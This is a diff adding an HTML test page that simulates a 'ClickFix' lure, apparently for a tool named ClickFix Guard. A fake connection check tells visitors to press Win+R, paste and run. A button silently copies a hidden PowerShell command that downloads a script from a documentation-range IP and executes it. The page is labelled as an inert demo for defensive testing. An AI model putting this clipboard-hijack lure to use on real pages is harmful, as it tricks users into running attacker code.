@@ -1,0 +1,22 @@
+<!doctype html>
+<!-- Simulated "checking your connection" lure (hidden textarea + execCommand). Inert: TEST-NET IP. -->
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Checking your connection</title><link rel="stylesheet" href="lure.css"></head>
+<body>
+  <h1>Checking if the site connection is secure</h1>
+  <p>Complete the check to continue: press <kbd>Win</kbd> + <kbd>R</kbd>, then <kbd>Ctrl</kbd> + <kbd>V</kbd>, then <kbd>Enter</kbd>.</p>
+  <button id="verify">Verify</button>
+  <script src="lure.js"></script>
+  <script>
+    const payload = 'powershell -w hidden -c "iwr http://203.0.113.5/a.ps1 -UseBasicParsing | iex" # ClickFix Guard demo, harmless';
+    document.getElementById("verify").addEventListener("click", () => {
+      reportCopy("hidden", payload);
+      const ta = document.createElement("textarea");
+      ta.value = payload;
+      ta.style.position = "fixed"; ta.style.opacity = "0";
+      document.body.append(ta); ta.focus(); ta.select();
+      document.execCommand("copy");
+      ta.remove();
+    });
+  </script>
+</body></html>
